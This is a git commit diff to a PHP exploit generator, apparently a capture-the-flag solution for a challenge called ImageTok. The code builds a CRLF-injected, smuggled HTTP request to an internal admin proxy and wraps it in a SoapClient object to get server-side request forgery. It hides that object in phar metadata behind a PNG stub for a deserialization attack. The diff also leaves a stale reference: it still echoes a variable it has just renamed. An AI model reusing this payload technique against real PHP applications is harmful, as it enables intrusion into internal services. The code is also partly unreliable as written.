9670d3878eeaec9366bc63a3de03385e68215d15
d4rkstat1c <44454186+d4rk007@users.noreply.github.com>
2021-06-04 00:50:48 +0000

    Update payload_gen.php

--- ImageTok/payload_gen.php
+++ ImageTok/payload_gen.php
@@ -1,7 +1,7 @@
 <?php
-/*
-Coded by d4rkstat1c
-*/
+  /*
+  Coded by d4rkstat1c
+  */
   class ImageModel {
       public $file;
       public function __construct($file) {
@@ -20,6 +20,10 @@ Coded by d4rkstat1c
 
   $localhost = 'http://127.0.0.1';
   $CRLF = "\r\n";
+  $crlf_init_str = $CRLF . 
+      'Content-Length: 0' .
+      str_repeat($CRLF, 2);
+
   $smug_headers = [
       'POST /proxy HTTP/1.1',
       'Host: admin.imagetok.htb',
@@ -29,34 +33,30 @@ Coded by d4rkstat1c
       'Content-Length: ' . (string)strlen($post_data)
       ];
 
-  $crlf_inject_str = $CRLF . 
-      'Content-Length: 0' .
-      str_repeat($CRLF, 2);
-
   $smug_headers_str = join($CRLF, $smug_headers) .
       str_repeat($CRLF, 2);
 
-  $ssrf_payload =
-       $crlf_inject_str .
+  $crlf_payload =
+       $crlf_init_str .
        $smug_headers_str .
        $post_data;
 
   echo $ssrf_payload . "\n";
 
-  $object = new ImageModel(new SoapClient(null, array(
+  $ssrf_object = new ImageModel(new SoapClient(null, array(
           'uri' => 'bbb',
           'location' => $localhost,
-          'user_agent' => 'xxx' . $ssrf_payload,
+          'user_agent' => 'xxx' . $crlf_payload,
       )));
 
-  $a = fread(fopen("image.png", "rb"), filesize("image.png"));
+  $png_data = fread(fopen('image.png', 'rb'), filesize('image.png'));
   $phar = new Phar('exploit.phar');
   $phar->startBuffering();
   $phar->addFromString('test.txt', 'test');
-  $phar->setStub($a . ' __HALT_COMPILER(); ? >');
-  $phar->setMetadata($object);
+  $phar->setStub($png_data . ' __HALT_COMPILER(); ? >');
+  $phar->setMetadata($ssrf_object);
   $phar->stopBuffering();
   rename('exploit.phar', 'exploit.png');
 
-  echo serialize($object) . "\n";
+  echo serialize($ssrf_object) . "\n";
 ?>
